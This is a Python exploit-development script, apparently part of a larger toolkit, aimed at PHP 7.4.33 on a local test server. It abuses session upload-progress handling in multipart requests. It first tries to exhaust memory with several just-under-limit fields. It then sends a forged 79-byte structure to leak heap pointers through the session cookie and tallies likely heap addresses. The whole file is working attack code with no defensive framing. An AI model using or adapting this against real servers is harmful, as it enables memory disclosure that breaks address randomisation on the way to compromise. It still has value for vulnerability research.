"""Try to trigger OOM on 7.4.33 via multiple sub-limit (1.8MB) fields, then test the leak.
The exploit's 12MB big field is blocked by the ~1.9MB per-field ceiling, so accumulate instead."""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18108/"

def fire_oom(nfields, fsize_mb, label):
    t = E.Target(URL, timeout=90.0, verbose=False)
    parts = []
    for i in range(nfields):
        parts.append({"name": f"m{i:04d}", "data": b"M" * int(fsize_mb * 1024 * 1024)})
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    body = E.build_multipart(parts, b"S" * 17)
    try:
        resp = t.post(body, b"S" * 17, read_cap=1 << 20, timeout=90.0)
        oom = b"Allowed memory size" in resp or b"Fatal error" in resp
        print(f"  OOM [{label}]: oom_visible={oom} cookie={len(E.parse_cookie(resp))}B", flush=True)
    except Exception as e:
        print(f"  OOM [{label}]: EXC {e}", flush=True)
    time.sleep(0.4)

def fire_leak(n=841):
    t = E.Target(URL, timeout=90.0, verbose=False)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=90.0)
    raw = E.parse_cookie(resp)
    if len(raw) >= 16:
        c = Counter()
        for i in range(0, len(raw) - 8, 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x700000000000 <= v < 0x800000000000:
                c[v & ~0x1FFFFF] += 1
        top = c.most_common(3) if c else []
        print(f"  LEAK: cookie={len(raw)}B heap={[(hex(k), v) for k, v in top]}", flush=True)
        return any(v >= 8 for _, v in top)
    print(f"  LEAK: cookie={len(raw)}B (no heap ptrs)", flush=True)
    return False

# Try accumulating past 8M with sub-limit fields
for nfields in [4, 5, 6]:
    print(f"\n=== {nfields} x 1.8MB ({nfields*1.8}MB total) ===", flush=True)
    fire_oom(nfields, 1.8, f"{nfields}x1.8M")
    fire_leak()
    time.sleep(0.5)
